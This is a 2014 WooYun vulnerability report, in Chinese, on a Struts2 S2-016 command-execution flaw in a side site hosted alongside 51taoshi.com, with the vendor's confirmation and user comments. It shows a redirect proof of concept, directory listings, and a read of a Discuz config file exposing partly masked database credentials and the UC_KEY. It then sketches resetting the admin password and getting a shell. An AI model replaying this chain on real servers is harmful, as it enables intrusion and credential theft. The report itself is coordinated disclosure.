{"id": 58886, "wybug_id": "wooyun-2014-049246", "wybug_title": "[淘师湾渗透测试#1]某站远程命令执行可导致shell", "wybug_corp": "51taoshi.com", "wybug_author": "开心超人", "wybug_date": "2014-01-26 18:10", "wybug_open_date": "2014-03-12 18:11", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-12：\t细节向公众公开  简要描述： RT 详细说明：  TOP1：信息搜集淘师湾主站及其大多数分站采用Apache struts2框架搭建，由于淘师湾在wooyun已收到类似报告 WooYun: 淘师湾某站struts2命令执行漏洞 ，可见在主站方面struts2漏洞无法利用。\nC:\\Users\\Administrator>nslookup 51taoshi.com服务器:  localhostAddress:  192.168.1.1非权威应答:名称:    51taoshi.comAddress:  219.139.243.44\n域名解析到219.139.243.44，在此服务器上搭建的站点有I1. www.thyuwen.com2. taoshi.org.cn3. 51taoshi.net.cn4. www.51taoshi.com5. www.51taoshi.cn6. bbs.51taoshi.com7. zuoye.51taoshi.com8. 51taoshi.com9. tyuan.51taoshi.com10. ziyuan.51taoshi.com11. yanxiu.51taoshi.com12. tv.51taoshi.com13. hbjjxt.e21.cnhbjjxt.e21.cn这个旁站引起了我的注意，同样采用struts2框架搭建TOP2:51taoshi.com旁站struts2 s2-016漏洞利用一般旁站安全性都不高（相对于一个服务器上的主要网站而言），测试结果表明，淘师湾管理或运维人员在修补struts2漏洞时并没有修补完全，这个旁站存在很严重的远程命令执行漏洞。POC：hbjjxt.e21.cn/loadLogin.action?redirect:http://www.yahoo.com/重定向至yahoo!\nTarget: http://hbjjxt.e21.cn/loadLogin.actionWhoami: weblogicWebPath: /data/webapps/hbjjxt\n在后来的检测中很遗憾淘师湾的struts2并没有开启上传功能，也许因为之前的报告原因。不论是渗透测试还是入侵，思路最重要，既然上传getshell被堵死了，那么便可以尝试别的方法。注意到bbs.51taoshi.com采用Discuz论坛搭建。接着我执行了如下Linux shell commond\nls /data====================================================================================================================================apphbjjxtlost+foundOraclesessionsoftwebappwebappsweblogs\n在接下来的摸索中顺利找到discuz论坛目录！\nls /data/webapp/bbs====================================================================================================================================��������20121028��.txt301test.php51taoshi_csmfpd51taoshi.phpadmin.phpaoyun.htmlapiapi.phparchiverbbxbbx.phpcomiis_adcomiis_config.phpcomiis_contactcomiis_csmfpdcomiis_dlcomiis_jymfpdcomiis_mfcspdcomiis_x19louconfigconnect.phpcontact.phpcp.phpcrossdomain.xmldatadbfavicon.icoforum.phpgroup.phphome.phpimageindex.phpmember.phpmisc.phpmobile.pngplugin.phppopuppp_imgportal.phprepair_uc.phprobots.txtsearch.phpsitemapsitemap.phpsourcestatictemplatetest.phpuc_clientuc_serveruserapp.phpweiboxuekexwbxwb.phpcat /data/webapp/bbs/config/config_ucenter.php====================================================================================================================================<?phpdefine('UC_CONNECT', 'mysql');define('UC_DBHOST', '211.85.*.*');define('UC_DBUSER', 'tao*');define('UC_DBPW', 'zs**');define('UC_DBNAME', 'bbs');define('UC_DBCHARSET', 'utf8');define('UC_DBTABLEPRE', '`bbs`.pre_ucenter_');define('UC_DBCONNECT', 0);define('UC_CHARSET', 'utf-8');define('UC_KEY', 'n0R7*****************************');define('UC_API', 'http://bbs.51taoshi.com/uc_server');define('UC_APPID', '*');define('UC_IP', '');define('UC_PPP', 20);\n直接获取到discuz论坛的UC_KEYTOP3：UC-KEY利用在本地搭建一个完整的Discuz论坛\n\n\n\n填入所获得的信息，具体利用细节参考 WooYun: 途牛网某服务配置失误 导致论坛敏感文件泄露(致使百万用户信息告急) 通过远程重置admin的密码即可进入后台\n\nTOP4：getshell通过一枚Discuz后台拿shell漏洞搞到SHELL，在此不披露详细技术细节。\n\n数据库访问权限\n\n   漏洞证明：  \n\n\n\n\n\n具体细节见上   修复方案：  1.网络边界要做好防护，攻击者在主站尝试突破无果时，试下旁站也可能会有意想不到的收获。2.参考http://sebug.net/vuldb/ssvid-60906      http://struts.apache.org/release/2.3.x/docs/s2-016.html   版权声明：转载请注明来源 开心超人@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-01-27 12:01 厂商回复： 工作疏忽，感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-21 13:09 |    \t\tXsL \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        )\t\t \n  Mark!!!!!    \n     2014-01-23 16:58 |    \t\t开心超人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Security just like girl friendHSL在此...)\t\t \n  @xsser 厂商不认领怎么办，都好几天了。。    \n     2014-01-23 16:59 |    \t\t开心超人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Security just like girl friendHSL在此...)\t\t \n  @XsL     \n     2014-01-25 14:13 |    \t\t开心超人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Security just like girl friendHSL在此...)\t\t \n  @淘师湾 你们就这样子忽视了吗。。。    \n     2014-01-25 14:18 |    \t\t开心超人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Security just like girl friendHSL在此...)\t\t \n  @淘师湾 我要的不是那一点点RANK，我要的是你们对待安全的态度    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}